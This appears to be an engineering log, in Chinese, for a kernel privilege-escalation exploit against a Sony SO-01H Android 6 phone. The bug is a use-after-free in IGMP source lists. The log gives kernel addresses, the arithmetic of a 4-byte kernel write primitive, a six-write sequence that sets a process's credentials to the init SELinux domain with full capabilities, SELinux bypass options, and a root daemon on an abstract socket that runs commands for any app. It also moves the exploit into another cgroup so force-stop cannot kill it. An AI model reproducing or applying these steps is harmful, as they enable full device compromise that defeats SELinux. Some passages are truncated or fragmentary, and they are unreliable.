- 唯一待验证点：在 `ss_initialized==1` 的正常状态下，
  `init` 域到底有没有 `security setenforce` 权限。
  有 ⇒ 整个架构成立；没有 ⇒ 只能回到"清标志"那条路，
  但至少要把 relabel 提前到清标志之前能打多少打多少。

## 24. 00:05~00:30 真相追加: "提权后所有日志消失" 是我们自己看不见，不是没成功

第 23 节把病因定在"清 ss_initialized 导致 sidtab 重建"，这个方向是对的；
但 23.5 里"连续 5 次竞速失败"是**误判**。这一节把误判挖掉了。

### 24.1 现象与误判

- `p78 > p78.txt` 只写到 `R1 ... s0c000708` 就断了；
  `step.txt` 停在 `S0 boot`；`rep.bin` 65536 字节**全是 0**；
  进程状态 `S` + `wchan=hrtimer_nanosleep`；`/proc/PID/status` 里 `Uid: 2000`。
- 于是判断为"竞速失败、卡在 hang()"。**全错。**

### 24.2 真因之一: 提权后写日志的系统调用全被 SELinux 拒

`klogw` 抓到的 dmesg（这一轮终于有现场）:

```
avc: denied { use } for pid=5653 comm="hohopwn0"
  path="/data/local/tmp/p78.txt" scontext=u:r:kernel:s0
  tcontext=u:r:shell:s0 tclass=fd permissive=0
```

提权瞬间 `cred->security` 变成 `u:r:kernel:s0`，之后：

- `write(1, ...)` 写 p78.txt → **-EACCES**（audit 里记 `fd: use`）
- `write(step_fd, ...)` 写 step.txt → 同上（而且 `stp()` 是**逐字节**写，
  一次 stp 就是十几条 deny）
- `msync()` 刷 rep.bin → 同样被拒 → 整个 rep.bin 从头到尾没人写过
- 连 `mark()` 里的 `write(1)` + `fsync(1)` 也照样拒

所以"日志在 WON 之前就断"不是流程断了，是**通道断了**。
而且每被拒一次都往 audit 塞一条记录，15 秒内 `audit_lost=2128`。

### 24.3 真因之二: `/proc/PID/status` 的 Uid 不能用来判断提权

`task_uid()` 读的是 `real_cred`，而 exploit 用的是 `override_creds()`
（只改 `cred`，不动 `real_cred`，这是为了避免 commit_creds 的
`BUG_ON(task->cred != task->real_cred)`）。所以提权成功后
`/proc/PID/status` 里永远还是 2000，`getuid()` 却已经是 0。

**这两条加起来，把一次成功的提权伪装成了"卡死"。**

### 24.4 新日志通道: 共享匿名页 + fork 抄写员

提权后唯一可靠的输出是**纯用户态 store**（不经过任何系统调用、不经过任何
SELinux hook）。做法:

1. 提权前 `mmap(MAP_SHARED|MAP_ANONYMOUS)` 一块 0x20000 的页（0x0b000000）；
2. 立刻 `fork()` 一个**常驻 shell 域**的子进程，它用自己干净的 cred
   每 50ms 把共享页里新增的字节 append 到 `/data/local/tmp/p78.log`；
3. 父进程"打日志"只是往共享页 memcpy + 递增序号。

实装后第一次跑就把整条链路照出来了（见 24.5）。

### 24.5 共享日志第一次跑出来的真相


1. **竞速没失败，第一次触发就赢了**。之前"连续 5 次失败"多半也是赢了但看不见。
2. **`init`(0x25) 和 `kernel`(1) 两个域都没有 `security:setenforce`**，

4. **但在 Enforcing 状态下、kernel 域 + fake 全 caps 就能把 su 装好**：
   `write` 864 字节 + `chown 0:0` + `chmod 06755` 全部返回 0。
   → **"装 su" 和 "变 permissive" 是两件独立的事**，前者已经不需要 permissive 了。

### 24.7 probe79: 按名字换域

`sid` 是运行时分配的，猜不准。但 `/proc/self/attr/current` 可以让内核
**自己做 context→sid**：

```
echo -n u:r:su:s0 > /proc/self/attr/current
```

`selinux_setprocattr()` 里 `security_context_to_sid()` 之后直接
`tsec->sid = sid`（改的就是我们那个假 tsec 页，不经过 prepare_creds），
所以可以借此把当前任务换到任意**策略里存在**的域，然后每个域试一次
setenforce 0。probe79 挨个试: `su / init / kernel / shell / system_server /
dumpstate / root / vold / installd / zygote`。

若某个域带 `setenforce`，这条路就通了，而且**全程不动 sidtab、不回灌策略**，
零污染。

### 24.8 顺手修掉的真 bug

`sleepms(int ms)` 原来写 `tv_nsec = ms * 1000000`，`ms=1000` 时正好 1e9
（上限 999999999）→ `nanosleep` 立刻 -EINVAL → `hang()` 变成
死循环烧满一核。之前所有"进程 100% CPU 卡死"都是这个。已改为
`tv_sec = ms/1000, tv_nsec = (ms%1000)*1e6`。

### 25.3 关于 `kwrite` 锚点的准确描述（之前文档写得含糊，这里写清）

```c
for (k = 0; k <= 9; k++) {
    S = W - 24 - 4*k;            // 假 ip_sf_socklist 起点
    if (*(u32*)(S+4) != k) continue;   // sl_count 必须恰好 == k
    if (*(u32*)(S)   == k) continue;   // sl_max 不能 == k
    // 写 val 到 psf->sl_addr[k] = S + 24 + 4k = W

return -2000;                    // 一个锚点都没有
```

即：**目标地址前 24~60 字节内，必须存在某个 4 字节处 `sl_count ∈ {0..9}`**。

`ss_initialized` 之所以能写，纯粹是撞上了 k=0 那个 `sl_max=0x00800002 / sl_count=0` 的巧合。

## 26. GLM 复盘评审的逐条核验（2026-11-09 21:50~22:20）

外部评审文档：《Z5-Root 复盘与路线建议》（原文已归档为 `docs/research/root-retrospective.md`）。
它提出 8 项"待验证"和一条新路线 G。这一节把能离线/只读核验的全部做完，
结论按"评审对不对"分类。**所有引用都带源码行号，可直接复核。**

### 26.1 评审说对了的（4 条，都已实证）

**(1) C.3 —— 换 `security_ops` 只需一次 4 字节写，评审正确，我之前想复杂了。**
`security_ops`(0xffffffc00187bc18) 指向 `selinux_ops`(0xffffffc001649388)，
`default_security_ops` 在 0xffffffc001645898，**高 32 位同为 0xffffffc0**，
小端下低 4 字节就是 0x01649388 → 只需把低半写成 0x01645898。
交接文档 §10 里"要写 8 字节、要做 `kwrite_n`"属于过度设计（作为通用技术仍有价值）。

**(2) C.7 —— 退出顺序，评审正确。**
`kernel/exit.c:811 exit_mm(tsk)` 在 `kernel/exit.c:819 exit_files(tsk)` **之前**。
SIGKILL 一个持 UAF 的进程：地址空间先拆 → 用户页 fake pmc 解除映射 →
随后 close(socket) → `ip_mc_drop_socket` 解引用已失效地址 → oops → panic。
这就是"强停 App 必重启"的机理，已定案。

**(3) C.5 —— setcon 要走 dynatransition，评审正确。**
`security/selinux/hooks.c:5630` 确实是
`avc_has_perm(tsec->sid, sid, SECCLASS_PROCESS, PROCESS__DYNTRANSITION, NULL)`。
user 版策略里这条授予面≈0，而且 `u:r:su:s0` 这个域大概率不存在于策略里
（`security_context_to_sid` 直接 -EINVAL）。**probe79 预期值≈0，不必再跑。**

**(4) C.4 —— 写原语的去重/插入逻辑，评审正确。**
`net/ipv4/igmp.c` `ip_mc_source()` 追加分支实测逻辑：
```c
if (psl && psl->sl_count >= sysctl_igmp_max_msf) → -ENOBUFS
if (!psl || psl->sl_count == psl->sl_max) → realloc + kfree_rcu(psl)   ← 必须避开
rv = 1; for (i=0;i<sl_count;i++) { rv = memcmp(&sl_addr[i], &src, 4); if (!rv) break; }
if (rv == 0) goto done;              // 重复值 → 不写，返回 -EADDRNOTAVAIL(-99)
for (j=sl_count-1;j>=i;j--) sl_addr[j+1]=sl_addr[j];
psl->sl_addr[i] = src; psl->sl_count++;
```
即"按序插入"，i 恰好等于 sl_count 时就是追加。kwrite 里 `if (mx == k) continue;`
就是在避开 realloc 分支。去重窗口 = `sl_addr[0..k-1]` = `W-4k .. W-4`，与评审一致。

### 26.2 评审说错或说浅了的（4 条）

**(5) C.2 —— 方向对，但缓解手段是错的。**
评审说"若 nf hook 开头有 `if (!selinux_enabled) return NF_ACCEPT;`，配合
`selinux_enabled=0` 可拆雷"。实测：**没有这个守卫**。
`hooks.c:6081 selinux_nf_ip_init()` 只在**注册时**看 `selinux_enabled`；
hook 本体不检查。而致命的是这一行：

```c
/* hooks.c:4843 selinux_ip_postroute_compat() */
struct sock *sk = skb->sk;
if (sk == NULL) return NF_ACCEPT;
sksec = sk->sk_security;                 // ← 换掉 ops 之后，新建 socket 这里就是 NULL
...
if (selinux_xfrm_postroute_last(sksec->sid, skb, &ad, proto))   // ← 4870 行，无条件求值
```
`sksec->sid` 是**函数实参，必然求值**，NULL 直接 oops。
所以换 `security_ops` 之后，任何**新建** socket 发出的第一个 IPv4 包就炸；
system_server 每秒都在建 socket。→ **路线 C 必须同时把 nf hook 也拆掉，否则必崩。**
（顺带：设备策略的 policycap 位 0/1 是开的，`selinux_ip_postroute` 可能走非 compat 分支，
那条分支在 `!secmark && !peerlbl` 时提前 `NF_ACCEPT`，也许能躲开——但这是概率，不是保证。）

**(6) G-2 —— 机制写错了，但方向救了回来。**
3.10 **没有** `TYPE_FLAGS_PERMISSIVE`：`struct type_datum` 只有
`{value, bounds, primary, attribute}`（`ss/policydb.h`），没有 flags 字段。
**但等价能力存在，只是换了地方**：

```c
/* ss/services.c:1096 security_compute_av() */
if (ebitmap_get_bit(&policydb.permissive_map, scontext->type))
        avd->flags |= AVD_FLAGS_PERMISSIVE;

/* avc.c:1049 avc_denied() */
if (selinux_enforcing && !(avd->flags & AVD_FLAGS_PERMISSIVE))
        return -EACCES;      // 有 flag 就不返回 EACCES → 允许
```
`permissive_map` 在 `ss/policydb.c:2385` 读入，条件是
`policyvers >= POLICYDB_VERSION_PERMISSIVE`，而 `include/security.h:30`
定义该值为 **23**。设备策略 `policyvers = 30` → **这个机制是活的**。
所以 G-2 成立，但补丁位置是 `permissive_map` 这个 ebitmap，不是类型 flags。
**而且它比 avtab 好改**：ebitmap 二进制格式极简（见 26.4）。

**(7) E.2 —— `kimg.bin` 的前提是错的，离线锚点普查不能直接做。**
`file dump/kimg.bin` = `Linux kernel ARM64 boot executable Image` —— 这是**启动镜像**，
不是运行时内存快照。证据：

```
security_ops 处(u32) = 0            # 运行时必然 = 0xffffffc001649388
selinux_ops  name 字段 = 全 0       # 运行时必然 = "selinux"
指向 selinux_ops 的 8 字节指针在整文件里只出现 1 次，位于 0x0f591b0（.rodata）
0x1649000-0x164a000 整 4KB 全 0     # .data 之后是洞
```
所以"扫 kimg.bin 得出锚点清单"会得出**错误结论**（.bss 在文件里是 0，
而运行时全是大指针，两者的锚点几何完全不同）。
→ 附带工具 `tools/anchor_scan.py` 的逻辑仍可用，但**必须换成现场 kread 的数据**，
或至少先用一次 kread 抽样校准。
（唯一自洽的一条：`ss_initialized` 在文件里正好有 k=0 锚点
`sl_max=0x00800002 / sl_count=0`，与实测"能写一次"吻合，可作扫描器逻辑的交叉验证。）

**(8) D.4-1 的推理链有漏洞。**
评审说"init 必然有 load_policy，否则起不了机"。**这个推理不成立**：
开机那次 load 发生时 `ss_initialized == 0`，而 `security_compute_av()` 一进来就
`if (!ss_initialized) goto allow;`（`ss/services.c:1085`）——
**权限检查根本没走到策略判定**，直接全放行。
所以"能开机"完全不能证明 init 有 `security:security load_policy`。
这仍是**未决问题**，必须靠解析策略或一次行为实验来答。

```
magic      0xf97cff8c            ✓ POLICYDB_MAGIC
len        8                     ✓ strlen("SE Linux")
str        "SE Linux"
policyvers 30                    ✓ Android 6，>= 23 → permissive_map 生效
```

**`permissive_map` 是空的**，这意味着给 init 加 permissive 需要**插入一个节点**：

因为策略是**纯顺序流式读取**（`next_entry`），插 12 字节是合法的，

### 26.4 G 路线（策略热加载）的源码级确认

| 环节 | 源码 | 结论 |
|---|---|---|
| 写 load 节点的权限检查 | `selinuxfs.c:519` `task_has_security(current, SECURITY__LOAD_POLICY)` | **没有** `ss_initialized` 前置判断 |
| 其他前置条件 | `selinuxfs.c:524-539` | `*ppos==0`、`count ≤ 64MB`、vmalloc+copy_from_user |
| reload 分支（ss_initialized==1） | `services.c:2047-2093` | `policydb_read(new)` → `policydb_load_isids(newsidtab)` → `sidtab_shutdown(old)` → `sidtab_map(clone_sid)` → `sidtab_map(convert_context)` |
| sid 编号 | 同上 `clone_sid` | **全部保留**，所有 inode/进程的 sid 继续有效 |
| 打标签 | — | hooks 不断、sidtab 不换号 ⇒ `inode_init_security` 照常写 xattr |
| 判决 | `services.c:1096` + `avc.c:1049` | 只有 `scontext->type ∈ permissive_map` 的域被放行；**其余域仍 Enforcing** |
| 回滚 | — | 补丁只在内存，磁盘上 `/sepolicy` 未动；重启即复原，**零残留** |

**这是目前最好的一条路**，理由不是"能 permissive"，而是：

> 它给出的是**进程级 permissive**（只有 init 类型的域被放行），
> 而不是全局 permissive。system_server / 相机 / 其他 App 的判定**完全不受影响**，
> 所以连"permissive 下的 audit 噪声"和"全局放宽的风险"都省了。

而且它需要的**内核写次数 = 0**（唯一的一次写是内核自己把 blob 读进去），
彻底绕开"4 字节 + 锚点 + 一 boot 一次"这个瓶颈。

### 28.2 新阻塞：触发后设备会"干净"硬复位（无 oops）

现象：链路跑完（甚至跑到 END）后 10~120 秒，设备直接重启，`dmesg` 里**没有任何**

| 假设 | 实验 | 结论 |
|---|---|---|
| LMK 杀进程 | `adb shell` 子进程继承 `oom_score_adj=-1000`（`cat /proc/self/oom_score_adj` 实测） | 排除 |

两个决定性的补充实验：

- **probe83**（赢后立刻 `g_stop=1` 停掉补丁线程）→ **在赢的瞬间就崩**，连 `WON` 都来不及打。

⇒ **补丁线程必须一直跑**：内核在 `call_rcu` 时把 `head->func` 写成自己的 kfree 回调，

- **probe85**（赢后把 `P_FAKE+24` 的 sflist 指针清 0，堵掉"别的进程读 /proc/net/igmp

  说明 igmp 遍历不是唯一死因。

### 28.3 目前最强推断：fake cred 与 rcu_head 别名

`CRED = PSL1 + 8`，而 `struct ip_sf_socklist` 的布局是：

```
PSL1+0x00  sl_max          -> cred->usage (低 4 字节)
PSL1+0x04  sl_count        -> cred->usage (高 4 字节) / uid
PSL1+0x08  rcu.next        <- ★ cred 起始地址
PSL1+0x10  rcu.func        <- 补丁线程一直写 OVERRIDE_CREDS, 也就是 cred->gid
```

也就是说 **`cred->usage`（CRED+0）就是 `rcu_head.next` 的低 32 位**。
`override_creds()` 一进去就 `atomic_inc(&new->usage)`，等于**直接给 RCU 链表的 next
指针做 +1**。这解释了为什么实测 `gid` 恰好等于 `OVERRIDE_CREDS & 0xffffffff`
（`00243f60`）——补丁线程写的那 8 字节就落在 cred->gid 上。

RCU 那边即使 `next = list->next` 是先取后调，只要这个 head 被二次入链/二次遍历，
next 就已经被 +1 破坏 → 链表变成野指针/成环 → 软中断里死循环 → APPS watchdog 硬复位，
且因为死锁卡在 printk 需要的锁上，**一个字都打不出来**。这与"无 oops 的干净复位"完全吻合。

### 28.4 下一步（按优先级）

1. **消除别名**：找一个"内核调用函数指针、参数是我们控制的对象"的原语，让 cred 不要
   和 rcu_head 重叠 8 字节。候选：`work_struct.func(work)`、`timer_list.function(timer)`、
   `packet_type.func`、`sk_filter`。判定标准：调用点只把参数当 cred 用，不再回头读它的
   前 16 字节。
2. **或者用 kwrite 做收尾**（4 字节内核写，`ip_mc_source` 的 `sl_addr[i]`）：
   - `inet_sock` 布局已确认（`include/net/inet_sock.h:183-185`）：
     ```
     int                        mc_index;   /* W-24 */
     __be32                     mc_addr;    /* W-20 */
     struct ip_mc_socklist *mc_list;        /* W    */
     ```
     kwrite 需要 `u32@(W-20-4k) == k && u32@(W-24-4k) != k`。
     若 `mc_index == 1`（组播绑在 lo 上），k=1 正好满足。
   - 清掉 `mc_list` 后，close/exit 不再 kfree 用户页；再把 `cred->security` 置 NULL
     （`selinux_cred_free` 里 `kfree(NULL)` 安全），最后想办法让 `put_cred` 不释放。
3. **保底**：如果 1、2 都走不通，就把"root 守护进程"做成**只活到用户手动关掉**，
   并接受 3 核空转（已实测不会热复位，130 秒安全），但必须解决 RCU 链表那条死因。

## §29 2026-11-10 22:10 推翻旧结论：真凶是 suspend，不是"赢之后必死"

### 29.1 一个决定性的对照实验

probe90 由 probe89 改出，唯一改动是：**赢之后什么都不做，纯空转 45 秒打心跳**

结果仍然是几秒~十几秒后复位，`p78.log` 停在 `HBA 0`。当时我据此断言
"死因在提权机制本身，与后续动作无关"。**这个断言是错的**，因为我把
"日志停在哪一行"当成了"进程死在哪一刻"，而提权后的日志通道本身会挂。

### 29.2 换抓法之后，现场完全变了

宿主侧流式抓取（`adb shell 'while true; do dmesg | tail -40; echo ==TICK; sleep 0.3; done' > 本地文件`），
复位瞬间断流，但断前的内容全在本地。得到的最后几行是：

```
[75.86] clearpad clearpad: suspend mode OK
[77.14] mdss_dsi_panel_off: ctrl=ffffffc0bf6c9018 ndx=0
[77.14] @@@@ panel power off @@@@
[然后 dmesg 彻底停止]
```

**没有任何 `Unable to handle` / `Call trace` / `panic` / `BUG`。** 这是
"熄屏 → 进 suspend → 在 suspend 路径里挂死 → APPS watchdog 硬复位"的典型形态。

### 29.3 直接验证：保持屏幕常亮

同一条 `p91`（Phase A 纯空转 45s 的版本），跑起来后**从宿主侧每 12 秒发一次

```

```

**结论：设备不是"提权就死"，而是"提权后一旦熄屏进入 suspend 才死"。**

### 29.4 这条结论推翻了什么

之前 §21 那张排除表里，"probe85 清 sflist"、"probe88/89 换 ret gadget"、
"probe87 持续压 usage" 这几条之所以"改了也没用"，不是因为机制判断错，
而是因为**它们都没触及真正的触发点**——真正的触发点是屏幕超时。

同理，"赢之后 5~20 秒必死"这个时间尺度是假的：那其实是系统默认 30 秒
屏幕超时减去竞态耗时后的残差。probe90/91/92 三次都"停在 HBA 0"也是假的：
是共享页抄写员进程先挂，而不是 exploit 死了。

### 29.5 顺带确认的两件事（源码 + 策略）

**(A) `prepare_creds()` 可以把假 cred "固化"成真正的内核对象。**
`kernel/cred.c:prepare_creds()`：

```c
new = kmem_cache_alloc(cred_jar, GFP_KERNEL);   // 真 slab 对象
memcpy(new, old /* = 我们的用户页 cred */, sizeof(struct cred));
atomic_set(&new->usage, 1);
...
new->security = NULL;                            // 关键
security_prepare_creds(new, old, GFP_KERNEL);
```

`security/selinux/hooks.c:3450 selinux_cred_prepare()`：

```c
old_tsec = old->security;                                    // = FAKE_TSEC 用户页
tsec = kmemdup(old_tsec, sizeof(struct task_security_struct), gfp);  // 新建真对象
new->security = tsec;
```

所以只要在 `set_tsec()` 之后调一次 `setresuid(0,0,0)`，`current->cred`
和 `cred->security` **全部落在内核堆上**，用户页不再被本进程引用。
这是消除"内核结构指向用户页"这一整类风险的正解。

**(B) 本内核没有 `selinux_task_fix_setuid`。**（`hooks.c` 里只有注释提到它）
即 uid/gid 变更不做 `process:setuid` 检查，所以上面那步不会被策略拦。
注意顺序要**先 uid 后 gid**：`cred->gid` 与 `rcu_head.func` 重叠，切域后还是垃圾值，
等 `setresgid` 时 old 已经是真 cred，检查走 init→init 必过。

### 29.6 提权后的可靠日志通道：/dev/kmsg

## §30 2026-11-10 22:45 对 §29 的自我修正：suspend 不是唯一死因

§29 写完之后又跑了四次，结果和 §29 的结论冲突，必须记录清楚，否则会把 GLM 带偏。

### 30.1 冲突的证据

| 运行 | 载荷 | 保屏 | 结果 |
|---|---|---|---|
| p91 | Phase A 空转 45s | 是 | **存活 180s**（uptime 326s） |
| p90 | Phase A 空转 45s（usage 未抬高） | 否 | 约 15s 复位 |
| p92 | Phase A 1.5s×2 + A1/A2 + 切域 + setresuid | 是 | 约 10s 复位 |
| p92 | 同 PR90 结构，重跑 | 是 | 约 10s 复位（`WON 1 / HBA 0` 后即死） |
| p95 | p92 + 消毒 | 是 | 约 1.5s 复位（`HBA 0` 后即死） |

**屏幕亮着也照样死**，所以 §29.3 的"suspend 是元凶"不成立（至少不是唯一死因）。

### 30.2 更可能的解释

1. §29.3 那次 180s 存活很可能是**假阳性**：p91 在 A1/A2 拿不到 sid 时会走
   `if (!isid) { hang(); }`，如果它卡在那里，就根本没做切域和后续动作，
   自然不会死。当时没看 `p78.log` 的完整内容就下了结论，这是我的失误。
2. 真正稳定复现的死点是**赢之后的 1~10 秒内**，且 `p78.log` 总是停在
   `HBA 0` / 刚切域附近。结合 `PHA usage0 40000002`（我们在 FIXED 里写的
   0x40000000 又被加了 2），说明 `override_creds` 在我们"修复"之后
   **仍在被调用**，假 cred 一直在往外来任务身上装。
3. 因此当前最可信的模型仍是：**共享的假 cred 被装到外来任务上，
   而这些任务的 `cred->security` 一旦指向我们的用户页，就会在任何一次
   AVC 检查时内核态缺页**。§29 里"要把假 cred 固化"的方向是对的，
   p95 加的"消毒"（把共享 cred 的 security 指回 init_cred->security）
   也是对的，但**当时没跑到那一步就死了**，所以还没被验证。

### 30.3 方法上的教训（比结论更重要）

- **不要用"用户态日志停在哪一行"推断"进程死在哪一刻"**。提权后日志通道会先挂，
   §29 就是栽在这里。
- 每次实验必须能独立证明"走到了哪一步"，否则结论不可靠。

## 31. probe112~119：真域突破 —— `u:r:init:s0` 拿到手，su 落地成功

### 31.1 一句话结论

**从未解锁 BL 的 SO-01H 上，通过 `cred->security` 的低 32 位写入，把当前进程的
SELinux 域从 `shell` 换成了 `u:r:init:s0`，且在 init 域下成功把 864 字节的 su
落到 `/mnt/su`（root:root / 04755 / shell_tmpfs）。设备不复位。**

这是全项目第一次拿到**真实且稳定**的 init 域，也是第一次在不触发 `ss_initialized=0`
那种全局自毁的前提下完成 su 落地。

### 31.2 三条硬事实（这次是靠 `/proc` 和 `rep.bin` 证实的，不是推断）

**(1) `find_task_pref` 一直找错方向 —— 这是 probe107~111 全部失败的真因之一**

`init_task.tasks` 是 `list_head`，`hd+0` 是 `next`，`hd+8` 是 `prev`。
旧代码读的是 `hd+8`，也就是**从"最后创建的任务"倒着走**，而 `init`(pid 1)
在链表最前端，400 步上限根本走不到，所以 `find_task_pref("init")` 永远返回 0。

改成读 `hd+0` 正向走后，probe112 立刻打印出：

```
ITC [swapper/0]                      <- 布局验证：INIT_TASK_A/OFF_COMM 正确
FOUND@00000000 IT ffffffffc0102a8000 IC ffffffffc0bd064900
TS  ffffffffc0b3b35440 osid 00000001 sid 00000025
```

`FOUND@0` 说明 init 就在链表第一个；`sid=0x25(37)` 是 init 域的动态 SID，
`osid=1` 是它从 kernel 域创建时留下的。

**(2) `init_cred->security` 没用，要的是 init 进程自己的 `cred->security`**

`init_cred`（swapper）的 tsec 是 `osid=1 / sid=1`，即 **kernel 域**，
而 kernel 域只有 `sys_boot,sys_nice,sys_resource`，什么都干不了。
必须取 pid 1 那个 init 进程的 cred。

**(3) `cred->security` 的高 32 位根本不需要写 —— 这是 probe110/111 的死因**

`security` 原本就是内核线性映射指针，高 32 位 = `0xffffffc0`；
init 的真 tsec 也是内核地址，高 32 位同样是 `0xffffffc0`。
**所以只写低 32 位就够。**

旧版本硬写 `0x74 = 0`，`kwrite` 的 `sl_count++` 副作用会打到 `0x60`
（`thread_keyring`），把它变成 1 → 野指针 → 下一次 `key_put()` 直接把设备打死。
probe109 的 `0x60/0x68` 也是同一个坑。

### 31.3 最终可用的 6 次写（锚点逐条验算过）

```
#  W     val          k   sl_max(S+0)        sl_count(S+4)
1  0x38  ffffffff     0   u32(0x20)=2000≠0   u32(0x24)=securebits=0
2  0x3c  00000003     0   u32(0x24)=1 ≠0     u32(0x28)=0
3  0x58  00000001     0   u32(0x40)=0xc0≠0   u32(0x44)=0
4  0x40  ffffffff     0   u32(0x28)=1 ≠0     u32(0x2c)=0
5  0x44  0000003f     0   u32(0x2c)=1 ≠0     u32(0x30)=0
6  0x70  <tsec lo>    0   u32(0x58)=1 ≠0     u32(0x5c)=0
```

- **第 3 步必须在第 4 步之前**：0x40 一旦写成 `ffffffff`，0x58 的锚点就没了。
- 第 1 步的副作用把 `securebits` 写成 1，第 2 步正好吃到这个锚点；
  第 2 步副作用写 `0x28`，第 4 步吃；第 4 步副作用写 `0x2c`，第 5 步吃。**链式成立。**
- 第 6 步副作用写 `0x5c`（`process_keyring` 高 32 位）→ `process_keyring`
  变成 `0x0000000100000001` 野指针。**靠 usage 保护，见 31.5。**
- 写完后 `cred->cap_effective = 0x00000003ffffffff`，`cap_bset = 0x0000003fffffffff`。

### 31.4 铁证：`/proc/<pid>/attr/current` = `u:r:init:s0`

### 31.5 崩溃点定位：不是写，是"cred 替换"

### 31.7 还差一步：`/mnt/su` 对 shell 域"不存在"

### 31.8 新的工程教训

- **探针不能靠进程名找自己**。多个常驻探针同名时 `find_task_pref` 会选错。
  要么每次跑前清场，要么改成按 pid 匹配。
- **`rep.bin` 是复用的**，多进程串行写会把前一个的输出冲掉/混在一起。
  看输出前先确认 pid 行对应的是哪一次。
- **提权后 `kread` 会先于 `kwrite` 失效**，所以"写完回读验证"这条路本身不可靠，
  必须换外部通道（`/proc`、文件属性、`ls -Z`）。

### 33.2 本轮三个决定性发现

#### ① `cap_permitted` 其实写得进去 —— 用 fsgid/fsuid 两步凑锚点

`kwrite` 的数学约束是 `W = S + 24 + 4·u32(S+4)`，即 `S = W − 24 − 4k`，且要求
`u32(S+4) == k`（k 是 sl_count，必须 < 10）、`u32(S) != k`。

想写 `cap_permitted`（0x30/0x34）：

| 目标 | S | 需要 sl_count(=fsgid/fsuid) | 需要 sl_max |
|---|---|---|---|
| `0x34` | `0x1c` | `u32(0x20)=fsgid == 0` | `u32(0x1c)=fsuid != 0` |
| `0x30` | `0x18` | `u32(0x1c)=fsuid == 0` | `u32(0x18)=egid != 0` |

两个条件互斥，但**有明确的先后顺序**：

```c
setfsgid(0);           // syscall 152 (aarch64!)  fsgid=0, fsuid 仍 2000
cred = kread64(task+0x4e0);      // ★ setfs* 会 prepare_creds→ 换新对象，指针必须重取
kwrite(cred+0x34, 0);            // prm 高 32 = 0
setfsuid(0);           // syscall 151          fsuid=0
cred = kread64(task+0x4e0);
kwrite(cred+0x30, 0xffffffff);   // prm 低 32 = 满
```

副作用：每次成功写入会把锚点字段 `+1`（fsgid 0→1、fsuid 0→1），无害。

> **坑**：项目里原有的 `sysc(122)` / `sysc(123)` 是 `sched_setaffinity` /
> `sched_getaffinity`，不是 `setfsuid/setfsgid`。aarch64 generic 表里
> **`setfsuid=151`、`setfsgid=152`**。用错号会拿到 `-EINVAL`。

#### ② exec 一定会清空 permitted，但 euid==0 时会自动补满

3.10 `security/commoncap.c` 原文（本轮抓下来逐行核对）：

```c
static int get_file_caps(...)
{
```

2. Android 在 zygote 里设了 `securebits=1`（SECURE_NOROOT），把这条路关死 ——

#### ③ app 进程带 `no_new_privs`，会把满 caps 夹回 1

```c

    bprm->unsafe & ~LSM_UNSAFE_PTRACE_CAP) {
    if (!capable(CAP_SETUID) || (bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS)) {
        new->euid = new->uid; new->egid = new->gid;

    new->cap_permitted = cap_intersect(new->cap_permitted, old->cap_permitted);   // ★

```

app 有 no_new_privs ⇒ `bprm->unsafe |= LSM_UNSAFE_NO_NEW_PRIVS` ⇒ 一定走这条，
于是 `满 ∩ 旧permitted`。而"旧 permitted"在 `setresuid(0,0,0)` 之后只剩 **1**
（只剩 CAP_CHOWN）—— 于是 app 里 exec 出来是 `uid=0 但 CapPrm=1`。

**修法：在 `setresuid` 之前先把 `cap_permitted` 写成 `0xffffffff`（见发现①）**，
这样 `intersect(满, 满) = 满`。

> 这一条是 app 域和 shell 域表现不一致的唯一原因：adb shell 没有 no_new_privs，
> 所以 shell 里一直是对的，app 里就一直"uid 0 但没权限"。没抓到第二条交集中的
> 这一行，会一直以为是 SELinux 或 bset 的问题。

### 33.5 root 服务设计（给其他 app 用）

- 抽象 unix socket：`@z5rootd`（SOCK_STREAM）。**连 abstract socket 不需要任何权限**，
  所以普通 app 也能连，不受 CapBnd=0 / SELinux 限制。
- 协议：客户端发 `cmd\n`，服务端 fork 一个子进程 → dup3 到 0/1/2 → 读一行 →
  `execve("/system/bin/sh", ["sh","-c",cmd])`，输出直接写回 socket。
- 客户端 `/mnt/su`：**优先连服务**（给真 root + 满 caps）；连不上才退回
  "就地 setresuid + capset"（只对 bounding set 完整的调用者有效）。
  支持 `su -c "cmd"` 与裸 `su`（裸 su 走 fork 双向转发）。

### 33.6 force-stop 会 panic —— 用 cgroup 迁移解决

现象：`am force-stop com.z5.root` 之后设备必然重启。
原因链：Android 6 的 `force-stop` 按 **`/acct/uid_<appuid>/cgroup.procs`** 枚举进程并
SIGKILL；我们虽然 `setresuid(0)` 把 uid 改成了 0，但仍留在 `uid_10257` 这个 cpuacct
cgroup 里，于是被一起杀掉 —— 而杀我们就等于关掉那个被 UAF 的 socket，
`ip_mc_drop_socket()` 走悬空链表 → kernel panic。

修法（两条一起）：
```c
setsid();                                          // 157，脱离 app 的进程组
mkdirat(AT_FDCWD, "/acct/uid_0", 0777);
fd = openat(AT_FDCWD, "/acct/uid_0/cgroup.procs", O_WRONLY);
write(fd, pid_str);                                // 把自己挪进 uid_0 cgroup
write(open("/proc/self/oom_score_adj"), "-1000");  // LMK 保命
```
实测：`cat /acct/uid_0/cgroup.procs` → 3 个 pid（exploit + 服务 + 自检子进程），
`am force-stop` 之后 **设备不重启，root 继续可用**。

### 33.7 已知限制 / 风险

1. **重启即失效**：所有写入都在内存里，重启回到 Enforcing，需要重新点一次 app。
   符合验收标准"开机手动触发一次"。
2. **触发时有小概率 panic 重启**：UAF 的 spray 是竞态的。实测本机大约
   3~4 次里有 1 次会在触发后几秒内黑屏重启（不丢数据）。重启后再点即可。
3. **不要让持有 UAF 的进程退出**：它退出 = 关 socket = panic。所以 exploit 拿到
   root 后进入 `hang()` 保活循环，root 服务是它的子进程。
4. **SELinux 关着**：全局 Permissive。这是提权路径的前提之一（setfsuid/setfsgid 需要），
   也是"系统功能正常"的隐患点 —— 需要长稳观察。
5. `/data/data` 之外，`/acct`、`/proc` 等目录在 uid 0 + 满 caps 下都能读，
   但**不要**在 root 服务里跑会 `pm`/`am` 的重操作，动作要克制。

### 36.1 修了 ETXTBSY

`drop()` 原本是 `new FileOutputStream(dst)` 原地覆盖。同一个 boot 内"重跑"时，
旧的 `./z5root` 还在执行，覆盖会抛 `ETXTBSY (Text file busy)`：

```
E Z5: java.io.FileNotFoundException: /data/user/0/com.z5.root/files/z5root:
      open failed: ETXTBSY (Text file busy)
      at com.z5.root.MainActivity.drop(MainActivity.java:316)
      at com.z5.root.MainActivity.work(MainActivity.java:214)
```

`work()` 于是在解包这一步就抛异常，表现为"点了重跑但什么都没发生"。
